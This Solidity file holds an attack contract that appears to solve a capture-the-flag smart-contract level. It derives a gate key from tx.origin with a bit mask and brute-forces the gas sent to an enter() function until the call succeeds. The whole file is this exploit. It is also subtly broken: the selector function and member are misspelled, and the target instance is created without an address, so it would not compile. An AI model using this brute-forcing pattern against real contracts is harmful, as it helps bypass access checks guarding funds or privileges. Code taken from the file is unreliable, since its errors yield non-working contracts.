// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface Instance {

    function enter(bytes8 _gateKey) external returns (bool);
}

contract Attack {

Instance instance = Instance();

function attack() public {

        bytes8 key = bytes8(uint64(uint160(tx.origin))) & 0xFFFFFFFF0000FFFF;
        for(uint i = 0; i < 300; ++i) {
            (bool success, ) = address(instance).call{gas: i + 8191 * 5}(abi.encodeWithSeletor(Instance.enter.seletor, key));
            if(success) {
                break;
            }
        }
    }

}
